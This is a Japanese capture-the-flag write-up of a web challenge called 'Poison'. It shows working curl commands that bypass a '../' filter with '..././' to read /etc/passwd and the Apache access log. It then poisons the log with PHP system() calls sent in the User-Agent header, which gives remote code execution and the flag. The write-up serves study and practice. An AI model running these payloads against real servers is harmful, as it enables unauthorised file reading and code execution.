# Poison:Web:pts
Bypass some stuff and get the flag!  
[Click here](https://ch4.sbug.se/)  

# Solution
ブラウザでアクセスすると、エラーが発生する。  
curlしてみる。  
```bash
$ curl https://ch4.sbug.se/
<iframe src="https://64.225.23.248" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
    Your browser doesn't support iframes
</iframe>
```
よくわからないがターゲットは`https://64.225.23.248`のようだ。  
httpsできないのでhttpでつなぐと謎のサイトだった。  
[site.png](site/site.png)  
`Where is the flag?`には`http://64.225.23.248/?file=inc.txt`がリンクされている。  
任意ファイルが読み込めそうだ。  
`../../../../../etc/passwd`を読み込むと以下のようなエラーが発生した。  
```bash
$ curl http://64.225.23.248/?file=../../../../../etc/passwd
~~~
    <a class="btn btn-primary" href=".?file=inc.txt" /> Where is the flag? </a><br><br><br />
<b>Warning</b>:  include(inc/etc/passwd): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>29</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'inc/etc/passwd' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>29</b><br />

    <!-- /someflagfile  --!>
~~~
```
`inc`以下にパスが接続され、`../`は削除されるようだ。  
`..././`によるバイパスを試みる。  
```bash
$ curl http://64.225.23.248/?file=..././..././..././..././..././etc/passwd
~~~
    <a class="btn btn-primary" href=".?file=inc.txt" /> Where is the flag? </a><br><br>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
Debian-exim:x:101:101::/var/spool/exim4:/bin/false

    <!-- /someflagfile  --!>
~~~
```
突破できたが、`/someflagfile`とある通り、ファイル名が不明である(ルートにあるようだ)。  
戯れに`http://64.225.23.248/admin`などにアクセスしていると、apacheであることがわかる。  
```bash
$ curl http://64.225.23.248/admin
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /admin was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at 64.225.23.248 Port 80</address>
</body></html>
```
アクセスログをヒントを求めて見てみる。  
```bash
$ curl http://64.225.23.248/?file=..././..././..././..././..././var/log/apache2/access.log
~~~
    <a class="btn btn-primary" href=".?file=inc.txt" /> Where is the flag? </a><br><br>- - [27/Nov/2021:08:28:27 +0000] "GET /?file=..././..././..././..././..././var/log/apache2/access.log HTTP/1.1" 200 791 "-" "curl/7.68.0"
- - [27/Nov/2021:08:28:36 +0000] "GET /?file=..././..././..././..././..././var/log/apache2/access.log HTTP/1.1" 200 929 "-" "curl/7.68.0"
- - [27/Nov/2021:08:28:40 +0000] "GET /?file=..././..././..././..././..././var/log/apache2/access.log HTTP/1.1" 200 1067 "-" "curl/7.68.0"

    <!-- /someflagfile  --!>
~~~
```
複数回にわたる自身のアクセスログが、User-Agentとともに残っていた。  
ここでUser-Agentにphpコードを入力し、ログから任意コードを実行する手法を思いつく。  
```bash
$ curl http://64.225.23.248/satoki -H "User-Agent: <?php system('ls /'); ?>"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
~~~
$ curl http://64.225.23.248/?file=..././..././..././..././..././var/log/apache2/access.log
~~~
    <a class="btn btn-primary" href=".?file=inc.txt" /> Where is the flag? </a><br><br>- - [27/Nov/2021:08:34:24 +0000] "GET /satoki HTTP/1.1" 404 444 "-" "bin
boot
dev
etc
getyourfl4g
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
"

    <!-- /someflagfile  --!>
~~~
```
任意コード実行が可能であった。  
`getyourfl4g`なる不審なファイルがあるので、catで読みだしてやる。  
```bash
$ curl http://64.225.23.248/satoki -H "User-Agent: <?php system('cat /getyourfl4g'); ?>"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
~~~
$ curl http://64.225.23.248/?file=..././..././..././..././..././var/log/apache2/access.log
~~~
    <a class="btn btn-primary" href=".?file=inc.txt" /> Where is the flag? </a><br><br>- - [27/Nov/2021:08:35:19 +0000] "GET /satoki HTTP/1.1" 404 444 "-" "SBCTF{You_Pois0ned_Me}
"

    <!-- /someflagfile  --!>
~~~
```

## SBCTF{You_Pois0ned_Me}